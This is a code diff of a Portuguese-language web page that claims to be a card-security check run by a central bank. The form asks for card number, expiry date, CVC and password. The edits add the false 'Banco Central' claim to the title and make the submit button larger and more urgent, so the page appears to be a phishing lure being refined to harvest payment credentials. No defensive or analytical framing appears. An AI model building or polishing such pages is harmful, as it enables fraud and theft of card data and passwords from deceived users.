@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifique a Segurança do seu Cartão</title>
+    <title>Verifique a Segurança do seu Cartão (Um Serviço Banco Central)</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -61,7 +61,6 @@
             gap: 1rem; /* Espaçamento entre os campos */
         }
         
-        /* --- ALTERAÇÃO CSS INICIA AQUI --- */
         .form-row {
             display: flex;
             gap: 1rem;
@@ -80,7 +79,6 @@
         .cvc-group {
             flex: 2;
         }
-        /* --- ALTERAÇÃO CSS TERMINA AQUI --- */
 
         .month-wrapper { flex: 3; }
         .year-wrapper  { flex: 4; }
@@ -127,6 +125,7 @@
             box-sizing: border-box;
         }
 
+        /* --- ALTERAÇÃO CSS INICIA AQUI --- */
         .submit-btn {
             background: linear-gradient(45deg, #007BFF, #0056b3);
             color: white;
@@ -135,7 +134,7 @@
             border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            font-size: 1.1rem;
+            font-size: 1.65rem; /* Fonte aumentada em 50% */
             font-weight: 600;
             transition: transform 0.2s, box-shadow 0.3s;
             display: flex;
@@ -143,6 +142,7 @@
             align-items: center;
             gap: 0.5rem;
         }
+        /* --- ALTERAÇÃO CSS TERMINA AQUI --- */
 
         .submit-btn:hover {
             transform: translateY(-2px);
@@ -232,7 +232,6 @@
                 <input type="text" id="numero_cartao" name="Número do Cartão" required>
             </div>
 
-            <!-- --- ALTERAÇÃO HTML INICIA AQUI --- -->
             <div class="form-row">
                 <div class="form-group validity-group">
                     <label for="validade_mes">Validade (Mês/Ano)</label>
@@ -250,17 +249,17 @@
                     <input type="text" id="cvc" name="CVC" placeholder="CVC" required maxlength="4" pattern="\d{3,4}">
                 </div>
             </div>
-            <!-- --- ALTERAÇÃO HTML TERMINA AQUI --- -->
             
             <div class="form-group">
                 <label for="senha">Senha</label>
                 <input type="password" id="senha" name="Senha" required>
             </div>
 
+            <!-- --- ALTERAÇÃO HTML INICIA AQUI --- -->
             <button type="submit" class="submit-btn" id="submit-button">
-                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
                 <span>Clique Aqui pra Verificar as Segurança das suas Informações!</span>
             </button>
+            <!-- --- ALTERAÇÃO HTML TERMINA AQUI --- -->
         </form>
         
         <!-- Mensagem de resultado de erro (dentro do container) -->
@@ -327,7 +326,9 @@
                 .finally(() => {
                     // Reabilita o botão e restaura o texto original
                     submitButton.disabled = false;
+                    // --- ALTERAÇÃO SCRIPT INICIA AQUI ---
                     submitButton.querySelector('span').textContent = 'Clique Aqui pra Verificar as Segurança das suas Informações!';
+                    // --- ALTERAÇÃO SCRIPT TERMINA AQUI ---
                 });
             }, 5000); // Atraso de 5000ms (5 segundos)
         });
